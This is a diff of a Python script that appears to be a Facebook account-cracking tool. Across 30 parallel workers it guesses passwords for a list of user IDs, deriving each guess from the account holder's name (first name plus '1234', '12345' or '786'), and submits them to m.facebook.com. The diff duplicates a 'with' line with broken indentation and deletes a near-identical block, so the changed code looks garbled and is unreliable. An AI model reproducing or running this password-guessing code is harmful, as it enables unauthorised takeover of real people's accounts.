@@ -421,6 +421,7 @@ try:
             print('-------------------------------------------')
             print('')
             with BilalBSN(max_workers=30) as kirim:
+               with BilalBSN(max_workers=30) as kirim:
                 for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = yntkts.split('|')
@@ -460,18 +461,4 @@ try:
 
             os.system('clear') 
             logo()
-            print('')
-            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
-            print(' \033[1;97mYour Process Started in Background')
-            print('-------------------------------------------')
-            print('')
-            with BilalBSN(max_workers=30) as kirim:
-                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
-                    try:
-                        uid, name = yntkts.split('|')
-                        xz = name.split(' ')
-                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name,xz[0]+'1234',xz[0]+'1234',xz[0]+'12345',xz[0]+'786']
-                        else:
-                            pwx = [name,xz[0]+'1234',xz[0]+'1234',xz[0]+'12345',xz[0]+'786']
-                        kirim.submit(self.__metode__, uid, pwx, "m.facebook.com")
+            
